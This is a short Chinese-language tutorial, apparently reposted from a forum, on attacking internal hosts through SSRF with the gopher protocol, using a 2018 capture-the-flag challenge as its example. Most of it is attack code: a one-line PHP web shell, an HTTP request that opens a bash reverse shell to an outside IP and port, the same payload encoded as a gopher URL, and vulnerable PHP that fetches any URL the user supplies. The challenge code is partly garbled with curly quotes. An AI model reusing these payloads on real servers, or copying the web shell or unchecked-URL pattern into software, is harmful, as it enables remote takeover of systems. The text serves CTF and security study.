# 攻击内网主机

> 原文：[https://www.zhihuifly.com/t/topic/3580](https://www.zhihuifly.com/t/topic/3580)

#### 攻击内网主机

假设有一台主机存在exp.php文件

```
//exp.php
<?php system($_POST[e]);?> 
```

利用方式：

```
POST /exp.php HTTP/1.1
Host: 127.0.0.1
User-Agent: curl/7.43.0
Accept: */*
Content-Length: 49
Content-Type: application/x-www-form-urlencoded `e=bash -i >%26 /dev/tcp/172.19.23.228/2333 0>%261` 
```

构造gopher协议的url：

```
gopher://127.0.0.1:80/_POST /exp.php HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i >%2526 /dev/tcp/172.19.23.228/2333 0>%25261null 
```

**湖湘杯2018**

```
<?php 
if(!isset($_GET['url'])){
  echo "ssrf me with parameter 'url'";
}
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $_GET['url']); 
//echo $_GET['url'];
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0); 
echo curl_exec($ch); 
curl_close($ch); `//var_dump($_POST);

$ip = $_SERVER[‘REMOTE_ADDR’];

if(isset($_POST[‘user’])){

if($_POST[‘user’]==“admin” && $ip==“127.0.0.1”){

system("/var/www/html/ssrf/readflag");

}

}

?>` 
```